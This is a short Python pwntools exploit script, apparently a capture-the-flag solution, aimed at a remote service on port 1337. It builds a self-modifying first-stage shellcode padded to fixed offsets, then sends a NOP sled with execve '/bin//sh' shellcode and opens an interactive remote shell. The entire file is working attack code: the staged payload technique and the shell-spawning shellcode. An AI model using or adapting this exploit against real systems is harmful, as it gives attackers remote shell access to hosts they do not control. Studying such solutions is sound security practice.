#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
#host = "10.211.55.17"
#port = 8888
host = "35.198.178.224"
port = 1337
r = remote(host,port)
context.arch = "amd64"
sc = asm("""
    add    DWORD PTR [rdi+0x7f],0x2
    add    DWORD PTR [rdi+0x43],0x3
    add    DWORD PTR [rdi+0x43],0x3
    add    DWORD PTR [rdi+0x43],0x3
    add    dword ptr [rdi+0x43],0x2
    add    dword ptr [rdi+0x49],0x2
    add    dword ptr [rdi+0x49],0x2
    add    dword ptr [rdi+0x49],0x3
    add    dword ptr [rdi+0x53],0x2
    add    dword ptr [rdi+0x53],0x3
    cmp    ebx,0xfffffffb
    mov    edi,ebx
""")
payload = sc.ljust(0x43,"\x95") + "\x8b"
payload = payload.ljust(0x49,"\x95") + "\x53"
payload = payload.ljust(0x53,"\x95") + "\x53" 
payload = payload.ljust(0x7f-3,"\x95") + "\x83\xfb\xfb" + "\x0d\x05\x02\x02"
r.send(payload.ljust(0x1000,"\x95"))
time.sleep(1)
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendline( "\x90"*0x100 + sc)
r.interactive()
